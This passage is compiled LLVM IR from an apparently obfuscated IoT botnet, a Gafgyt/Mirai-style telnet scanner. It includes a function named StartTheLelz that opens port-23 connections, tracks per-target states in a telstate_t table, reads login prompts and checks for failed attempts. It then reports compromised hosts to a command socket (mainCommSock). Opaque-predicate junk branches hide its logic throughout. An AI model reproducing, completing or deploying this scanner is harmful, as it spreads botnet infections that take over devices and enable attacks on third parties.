  %1050 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1049, i32 0, i32 2
  store i8 0, i8* %1050, align 8
  %1051 = load i32, i32* %10, align 4
  %1052 = sext i32 %1051 to i64
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1052
  %1054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1053, i32 0, i32 3
  store i8 1, i8* %1054, align 1
  %1055 = load i32, i32* @x.89
  %1056 = load i32, i32* @y.90
  %1057 = sub i32 %1055, 1
  %1058 = mul i32 %1055, %1057
  %1059 = urem i32 %1058, 2
  %1060 = icmp eq i32 %1059, 0
  %1061 = icmp slt i32 %1056, 10
  %1062 = or i1 %1060, %1061
  br i1 %1062, label %originalBBpart2130, label %originalBB128alteredBB

originalBBpart2130:                               ; preds = %originalBB128
  br label %1128

; <label>:1063:                                   ; preds = %1016
  %1064 = load i32, i32* %10, align 4
  %1065 = sext i32 %1064 to i64
  %1066 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1065
  %1067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1066, i32 0, i32 3
  store i8 3, i8* %1067, align 1
  %1068 = load i32, i32* %10, align 4
  %1069 = sext i32 %1068 to i64
  %1070 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1069
  %1071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1070, i32 0, i32 7
  %1072 = load i32, i32* %1071, align 16
  %1073 = add i32 %1072, 60
  %1074 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1075 = icmp ult i32 %1073, %1074
  br i1 %1075, label %1076, label %1110

; <label>:1076:                                   ; preds = %1063
  %1077 = load i32, i32* @x.89
  %1078 = load i32, i32* @y.90
  %1079 = sub i32 %1077, 1
  %1080 = mul i32 %1077, %1079
  %1081 = urem i32 %1080, 2
  %1082 = icmp eq i32 %1081, 0
  %1083 = icmp slt i32 %1078, 10
  %1084 = or i1 %1082, %1083
  br i1 %1084, label %originalBB132, label %originalBB132alteredBB

originalBB132:                                    ; preds = %originalBB132alteredBB, %1076
  %1085 = load i32, i32* %10, align 4
  %1086 = sext i32 %1085 to i64
  %1087 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1086
  %1088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1087, i32 0, i32 3
  %1089 = load i8, i8* %1088, align 1
  %1090 = zext i8 %1089 to i32
  %1091 = icmp ne i32 %1090, 3
  %1092 = load i32, i32* @x.89
  %1093 = load i32, i32* @y.90
  %1094 = sub i32 %1092, 1
  %1095 = mul i32 %1092, %1094
  %1096 = urem i32 %1095, 2
  %1097 = icmp eq i32 %1096, 0
  %1098 = icmp slt i32 %1093, 10
  %1099 = or i1 %1097, %1098
  br i1 %1099, label %originalBBpart2134, label %originalBB132alteredBB

originalBBpart2134:                               ; preds = %originalBB132
  br i1 %1091, label %1100, label %1101

; <label>:1100:                                   ; preds = %originalBBpart2134
  br label %1101

; <label>:1101:                                   ; preds = %1100, %originalBBpart2134
  %1102 = load i32, i32* %10, align 4
  %1103 = sext i32 %1102 to i64
  %1104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1103
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1104, i32 0, i32 2
  store i8 0, i8* %1105, align 8
  %1106 = load i32, i32* %10, align 4
  %1107 = sext i32 %1106 to i64
  %1108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1107
  %1109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1108, i32 0, i32 3
  store i8 1, i8* %1109, align 1
  br label %1110

; <label>:1110:                                   ; preds = %1101, %1063
  br label %1111

; <label>:1111:                                   ; preds = %1110, %originalBBpart2126, %961, %858, %824, %originalBBpart287, %692, %589, %originalBBpart260, %488, %originalBBpart240, %159
  %1112 = load i32, i32* @x.89
  %1113 = load i32, i32* @y.90
  %1114 = sub i32 %1112, 1
  %1115 = mul i32 %1112, %1114
  %1116 = urem i32 %1115, 2
  %1117 = icmp eq i32 %1116, 0
  %1118 = icmp slt i32 %1113, 10
  %1119 = or i1 %1117, %1118
  br i1 %1119, label %originalBB136, label %originalBB136alteredBB

originalBB136:                                    ; preds = %originalBB136alteredBB, %1111
  %1120 = load i32, i32* @x.89
  %1121 = load i32, i32* @y.90
  %1122 = sub i32 %1120, 1
  %1123 = mul i32 %1120, %1122
  %1124 = urem i32 %1123, 2
  %1125 = icmp eq i32 %1124, 0
  %1126 = icmp slt i32 %1121, 10
  %1127 = or i1 %1125, %1126
  br i1 %1127, label %originalBBpart2138, label %originalBB136alteredBB

originalBBpart2138:                               ; preds = %originalBB136
  br label %1128

; <label>:1128:                                   ; preds = %originalBBpart2138, %originalBBpart2130, %986, %926, %originalBBpart299, %805, %701, %657, %580, %536, %432, %412, %originalBBpart236
  %1129 = load i32, i32* %10, align 4
  %1130 = add nsw i32 %1129, 1
  store i32 %1130, i32* %10, align 4
  br label %110

; <label>:1131:                                   ; preds = %110
  %1132 = load i32, i32* @x.89
  %1133 = load i32, i32* @y.90
  %1134 = sub i32 %1132, 1
  %1135 = mul i32 %1132, %1134
  %1136 = urem i32 %1135, 2
  %1137 = icmp eq i32 %1136, 0
  %1138 = icmp slt i32 %1133, 10
  %1139 = or i1 %1137, %1138
  br i1 %1139, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %1131
  %1140 = load i32, i32* @x.89
  %1141 = load i32, i32* @y.90
  %1142 = sub i32 %1140, 1
  %1143 = mul i32 %1140, %1142
  %1144 = urem i32 %1143, 2
  %1145 = icmp eq i32 %1144, 0
  %1146 = icmp slt i32 %1141, 10
  %1147 = or i1 %1145, %1146
  br i1 %1147, label %originalBBpart2142, label %originalBB140alteredBB

originalBBpart2142:                               ; preds = %originalBB140
  br label %92
                                                  ; No predecessors!
  %1149 = load i32, i32* @x.89
  %1150 = load i32, i32* @y.90
  %1151 = sub i32 %1149, 1
  %1152 = mul i32 %1149, %1151
  %1153 = urem i32 %1152, 2
  %1154 = icmp eq i32 %1153, 0
  %1155 = icmp slt i32 %1150, 10
  %1156 = or i1 %1154, %1155
  br i1 %1156, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %1148
  %1157 = load i32, i32* @x.89
  %1158 = load i32, i32* @y.90
  %1159 = sub i32 %1157, 1
  %1160 = mul i32 %1157, %1159
  %1161 = urem i32 %1160, 2
  %1162 = icmp eq i32 %1161, 0
  %1163 = icmp slt i32 %1158, 10
  %1164 = or i1 %1162, %1163
  br i1 %1164, label %originalBBpart2146, label %originalBB144alteredBB

originalBBpart2146:                               ; preds = %originalBB144
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %1165 = alloca i32, align 4
  %1166 = alloca i32, align 4
  %1167 = alloca i32, align 4
  %1168 = alloca i32, align 4
  %1169 = alloca i32, align 4
  %1170 = alloca i32, align 4
  %1171 = alloca [128 x i8], align 16
  %1172 = alloca i8, align 1
  %1173 = alloca %struct.__sigset_t, align 8
  %1174 = alloca %struct.timeval, align 8
  %1175 = alloca i32, align 4
  %1176 = alloca [256 x i8], align 16
  %1177 = alloca i8*, align 8
  %1178 = alloca %struct.sockaddr_in, align 4
  %1179 = alloca i8*, align 8
  %1180 = alloca i8*, align 8
  %1181 = alloca i32, align 4
  %1182 = alloca i32, align 4
  store i32 512, i32* %1165, align 4
  %1183 = load i32, i32* %1165, align 4
  store i32 %1183, i32* %1170, align 4
  %1184 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1185 = call i32 @rand_cmwc()
  %_ = sub i32 %1184, %1185
  %gen = mul i32 %_, %1185
  %_1 = sub i32 %1184, %1185
  %gen2 = mul i32 %_1, %1185
  %_3 = sub i32 0, %1184
  %gen4 = add i32 %_3, %1185
  %1186 = xor i32 %1184, %1185
  call void @srand(i32 %1186) #5
  %1187 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1178, i32 0, i32 0
  store i16 2, i16* %1187, align 4
  %1188 = call zeroext i16 @htons(i16 zeroext 23) #13
  %1189 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1178, i32 0, i32 1
  store i16 %1188, i16* %1189, align 2
  %1190 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1178, i32 0, i32 3
  %1191 = getelementptr inbounds [8 x i8], [8 x i8]* %1190, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1191, i8 0, i64 8, i32 4, i1 false)
  %1192 = call noalias i8* @malloc(i64 513) #5
  store i8* %1192, i8** %1177, align 8
  %1193 = load i8*, i8** %1177, align 8
  call void @llvm.memset.p0i8.i64(i8* %1193, i8 0, i64 513, i32 1, i1 false)
  %1194 = load i32, i32* %1170, align 4
  %1195 = zext i32 %1194 to i64
  %1196 = call i8* @llvm.stacksave()
  store i8* %1196, i8** %1179, align 8
  %1197 = alloca %struct.telstate_t, i64 %1195, align 16
  %1198 = bitcast %struct.telstate_t* %1197 to i8*
  %1199 = load i32, i32* %1170, align 4
  %1200 = sext i32 %1199 to i64
  %_5 = sub i64 %1200, 5
  %gen6 = mul i64 %_5, 5
  %_7 = sub i64 0, %1200
  %gen8 = add i64 %_7, 5
  %_9 = sub i64 0, %1200
  %gen10 = add i64 %_9, 5
  %_11 = sub i64 0, %1200
  %gen12 = add i64 %_11, 5
  %_13 = shl i64 %1200, 5
  %_14 = sub i64 0, %1200
  %gen15 = add i64 %_14, 5
  %1201 = mul i64 %1200, 5
  call void @llvm.memset.p0i8.i64(i8* %1198, i8 0, i64 %1201, i32 16, i1 false)
  store i32 0, i32* %1166, align 4
  br label %originalBB

originalBB16alteredBB:                            ; preds = %originalBB16, %72
  %1202 = load i32, i32* %10, align 4
  %_17 = shl i32 %1202, 1
  %_18 = shl i32 %1202, 1
  %1203 = add nsw i32 %1202, 1
  store i32 %1203, i32* %10, align 4
  br label %originalBB16

originalBB22alteredBB:                            ; preds = %originalBB22, %93
  store i32 0, i32* %10, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %114
  %1204 = load i32, i32* %10, align 4
  %1205 = sext i32 %1204 to i64
  %1206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1205
  %1207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1206, i32 0, i32 7
  %1208 = load i32, i32* %1207, align 16
  %1209 = icmp eq i32 %1208, 0
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %137
  %1210 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1211 = load i32, i32* %10, align 4
  %1212 = sext i32 %1211 to i64
  %1213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1212
  %1214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1213, i32 0, i32 7
  store i32 %1210, i32* %1214, align 16
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %218
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %281
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %299
  %1215 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %17, i32 0, i32 0
  %1216 = getelementptr inbounds [16 x i64], [16 x i64]* %1215, i64 0, i64 0
  %1217 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %1216) #5, !srcloc !6
  %1218 = extractvalue { i64, i64* } %1217, 0
  %1219 = extractvalue { i64, i64* } %1217, 1
  %1220 = trunc i64 %1218 to i32
  store i32 %1220, i32* %25, align 4
  %1221 = ptrtoint i64* %1219 to i64
  %1222 = trunc i64 %1221 to i32
  store i32 %1222, i32* %26, align 4
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %413
  %1223 = load i32, i32* %11, align 4
  %1224 = icmp eq i32 %1223, -1
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %457
  %1225 = load i32, i32* %10, align 4
  %1226 = sext i32 %1225 to i64
  %1227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1226
  %1228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1227, i32 0, i32 0
  %1229 = load i32, i32* %1228, align 16
  %1230 = call i32 @sclose(i32 %1229)
  %1231 = load i32, i32* %10, align 4
  %1232 = sext i32 %1231 to i64
  %1233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1232
  %1234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1233, i32 0, i32 2
  store i8 0, i8* %1234, align 8
  %1235 = load i32, i32* %10, align 4
  %1236 = sext i32 %1235 to i64
  %1237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1236
  %1238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1237, i32 0, i32 3
  store i8 1, i8* %1238, align 1
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %489
  %1239 = load i32, i32* %10, align 4
  %1240 = sext i32 %1239 to i64
  %1241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1240
  %1242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1241, i32 0, i32 0
  %1243 = load i32, i32* %1242, align 16
  %1244 = load i32, i32* %10, align 4
  %1245 = sext i32 %1244 to i64
  %1246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1245
  %1247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1246, i32 0, i32 9
  %1248 = load i8*, i8** %1247, align 8
  %1249 = call i32 @read_until_response(i32 %1243, i32 10000, i8* %1248, i32 512, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @phone, i32 0, i32 0))
  %1250 = icmp ne i32 %1249, 0
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %555
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %607
  %1251 = load i32, i32* %10, align 4
  %1252 = sext i32 %1251 to i64
  %1253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1252
  %1254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1253, i32 0, i32 9
  %1255 = load i8*, i8** %1254, align 8
  %1256 = call i32 @contains_fail(i8* %1255)
  %1257 = icmp ne i32 %1256, 0
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %636
  %1258 = load i32, i32* %10, align 4
  %1259 = sext i32 %1258 to i64
  %1260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1259
  %1261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1260, i32 0, i32 2
  store i8 5, i8* %1261, align 8
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %658
  %1262 = load i32, i32* %10, align 4
  %1263 = sext i32 %1262 to i64
  %1264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1263
  %1265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1264, i32 0, i32 7
  %1266 = load i32, i32* %1265, align 16
  %_71 = sub i32 %1266, 6
  %gen72 = mul i32 %_71, 6
  %_73 = shl i32 %1266, 6
  %_74 = sub i32 0, %1266
  %gen75 = add i32 %_74, 6
  %_76 = sub i32 0, %1266
  %gen77 = add i32 %_76, 6
  %_78 = sub i32 %1266, 6
  %gen79 = mul i32 %_78, 6
  %_80 = sub i32 0, %1266
  %gen81 = add i32 %_80, 6
  %1267 = add i32 %1266, 6
  %1268 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1269 = icmp ult i32 %1267, %1268
  br label %originalBB70

originalBB85alteredBB:                            ; preds = %originalBB85, %710
  %1270 = load i32, i32* %10, align 4
  %1271 = sext i32 %1270 to i64
  %1272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1271
  %1273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1272, i32 0, i32 2
  store i8 6, i8* %1273, align 8
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %757
  %1274 = load i32, i32* %10, align 4
  %1275 = sext i32 %1274 to i64
  %1276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1275
  %1277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1276, i32 0, i32 2
  store i8 0, i8* %1277, align 8
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %778
  %1278 = load i32, i32* @mainCommSock, align 4
  %1279 = load i32, i32* %10, align 4
  %1280 = sext i32 %1279 to i64
  %1281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1280
  %1282 = call i8* @get_telstate_host(%struct.telstate_t* %1281)
  %1283 = call i32 (i32, i8*, ...) @sockprintf(i32 %1278, i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.304, i32 0, i32 0), i8* %1282)
  %1284 = load i32, i32* %10, align 4
  %1285 = sext i32 %1284 to i64
  %1286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1285
  %1287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1286, i32 0, i32 2
  store i8 7, i8* %1287, align 8
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %833
  %1288 = load i32, i32* %10, align 4
  %1289 = sext i32 %1288 to i64
  %1290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1289
  %1291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1290, i32 0, i32 2
  store i8 0, i8* %1291, align 8
  %1292 = load i32, i32* %10, align 4
  %1293 = sext i32 %1292 to i64
  %1294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1293
  %1295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1294, i32 0, i32 3
  store i8 1, i8* %1295, align 1
  br label %originalBB97

originalBB101alteredBB:                           ; preds = %originalBB101, %884
  %1296 = load i32, i32* %10, align 4
  %1297 = sext i32 %1296 to i64
  %1298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1297
  %1299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1298, i32 0, i32 2
  store i8 0, i8* %1299, align 8
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %905
  %1300 = load i32, i32* %10, align 4
  %1301 = sext i32 %1300 to i64
  %1302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1301
  %1303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1302, i32 0, i32 2
  store i8 9, i8* %1303, align 8
  br label %originalBB105

originalBB109alteredBB:                           ; preds = %originalBB109, %927
  %1304 = load i32, i32* %10, align 4
  %1305 = sext i32 %1304 to i64
  %1306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1305
  %1307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1306, i32 0, i32 7
  %1308 = load i32, i32* %1307, align 16
  %_110 = sub i32 0, %1308
  %gen111 = add i32 %_110, 6
  %_112 = shl i32 %1308, 6
  %_113 = sub i32 %1308, 6
  %gen114 = mul i32 %_113, 6
  %_115 = sub i32 0, %1308
  %gen116 = add i32 %_115, 6
  %1309 = add i32 %1308, 6
  %1310 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1311 = icmp ult i32 %1309, %1310
  br label %originalBB109

originalBB120alteredBB:                           ; preds = %originalBB120, %962
  %1312 = load i32, i32* %10, align 4
  %1313 = sext i32 %1312 to i64
  %1314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1313
  %1315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1314, i32 0, i32 0
  %1316 = load i32, i32* %1315, align 16
  %1317 = call i64 @send(i32 %1316, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.306, i32 0, i32 0), i64 12, i32 16384)
  %1318 = icmp slt i64 %1317, 0
  br label %originalBB120

originalBB124alteredBB:                           ; preds = %originalBB124, %995
  %1319 = load i32, i32* %10, align 4
  %1320 = sext i32 %1319 to i64
  %1321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1320
  %1322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1321, i32 0, i32 2
  store i8 10, i8* %1322, align 8
  br label %originalBB124

originalBB128alteredBB:                           ; preds = %originalBB128, %1032
  %1323 = load i32, i32* %10, align 4
  %1324 = sext i32 %1323 to i64
  %1325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1324
  %1326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1325, i32 0, i32 0
  %1327 = load i32, i32* %1326, align 16
  %1328 = call i32 @sclose(i32 %1327)
  %1329 = load i32, i32* %10, align 4
  %1330 = sext i32 %1329 to i64
  %1331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1330
  %1332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1331, i32 0, i32 2
  store i8 0, i8* %1332, align 8
  %1333 = load i32, i32* %10, align 4
  %1334 = sext i32 %1333 to i64
  %1335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1334
  %1336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1335, i32 0, i32 3
  store i8 1, i8* %1336, align 1
  br label %originalBB128

originalBB132alteredBB:                           ; preds = %originalBB132, %1076
  %1337 = load i32, i32* %10, align 4
  %1338 = sext i32 %1337 to i64
  %1339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %41, i64 %1338
  %1340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1339, i32 0, i32 3
  %1341 = load i8, i8* %1340, align 1
  %1342 = zext i8 %1341 to i32
  %1343 = icmp ne i32 %1342, 3
  br label %originalBB132

originalBB136alteredBB:                           ; preds = %originalBB136, %1111
  br label %originalBB136

originalBB140alteredBB:                           ; preds = %originalBB140, %1131
  br label %originalBB140

originalBB144alteredBB:                           ; preds = %originalBB144, %1148
  br label %originalBB144
}

declare i32 @time(...) #4

; Function Attrs: nounwind
declare void @srand(i32) #2

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #2

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz() #0 {
  %1 = load i32, i32* @x.91
  %2 = load i32, i32* @y.92
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [128 x i8], align 16
  %14 = alloca i8, align 1
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct.__sigset_t, align 8
  %19 = alloca %struct.timeval, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca [256 x i8], align 16
  %23 = alloca i8*, align 8
  %24 = alloca %struct.sockaddr_in, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  store i32 10, i32* %15, align 4
  store i32 1000, i32* %16, align 4
  %29 = load i32, i32* %16, align 4
  store i32 %29, i32* %17, align 4
  %30 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %31 = call i32 @rand_cmwc()
  %32 = xor i32 %30, %31
  call void @srand(i32 %32) #5
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  store i16 2, i16* %33, align 4
  %34 = call zeroext i16 @htons(i16 zeroext 23) #13
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 8, i32 4, i1 false)
  %38 = call noalias i8* @malloc(i64 513) #5
  store i8* %38, i8** %23, align 8
  %39 = load i8*, i8** %23, align 8
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 513, i32 1, i1 false)
  %40 = load i32, i32* %17, align 4
  %41 = zext i32 %40 to i64
  %42 = call i8* @llvm.stacksave()
  store i8* %42, i8** %25, align 8
  %43 = alloca %struct.telstate_t, i64 %41, align 16
  %44 = bitcast %struct.telstate_t* %43 to i8*
  %45 = load i32, i32* %17, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 5
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 %47, i32 16, i1 false)
  store i32 0, i32* %9, align 4
  %48 = load i32, i32* @x.91
  %49 = load i32, i32* @y.92
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %56

; <label>:56:                                     ; preds = %originalBBpart224, %originalBBpart2
  %57 = load i32, i32* %9, align 4
  %58 = load i32, i32* %17, align 4
  %59 = icmp slt i32 %57, %58
  br i1 %59, label %60, label %93

; <label>:60:                                     ; preds = %56
  %61 = load i32, i32* %9, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %62
  %64 = bitcast %struct.telstate_t* %63 to i8*
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 32, i32 16, i1 false)
  %65 = load i32, i32* %9, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %66
  %68 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %67, i32 0, i32 3
  store i8 1, i8* %68, align 1
  %69 = load i8*, i8** %23, align 8
  %70 = load i32, i32* %9, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %71
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %72, i32 0, i32 9
  store i8* %69, i8** %73, align 8
  br label %74

; <label>:74:                                     ; preds = %60
  %75 = load i32, i32* @x.91
  %76 = load i32, i32* @y.92
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %74
  %83 = load i32, i32* %9, align 4
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %9, align 4
  %85 = load i32, i32* @x.91
  %86 = load i32, i32* @y.92
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart224, label %originalBB20alteredBB

originalBBpart224:                                ; preds = %originalBB20
  br label %56

; <label>:93:                                     ; preds = %56
  store i32 0, i32* %11, align 4
  br label %94

; <label>:94:                                     ; preds = %117, %93
  %95 = load i32, i32* @x.91
  %96 = load i32, i32* @y.92
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %94
  %103 = load i32, i32* %11, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %11, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %105
  %107 = load i8*, i8** %106, align 8
  %108 = icmp ne i8* %107, null
  %109 = load i32, i32* @x.91
  %110 = load i32, i32* @y.92
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart233, label %originalBB26alteredBB

originalBBpart233:                                ; preds = %originalBB26
  br i1 %108, label %117, label %118

; <label>:117:                                    ; preds = %originalBBpart233
  br label %94

; <label>:118:                                    ; preds = %originalBBpart233
  br label %119

; <label>:119:                                    ; preds = %1191, %118
  %120 = load i32, i32* @x.91
  %121 = load i32, i32* @y.92
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %119
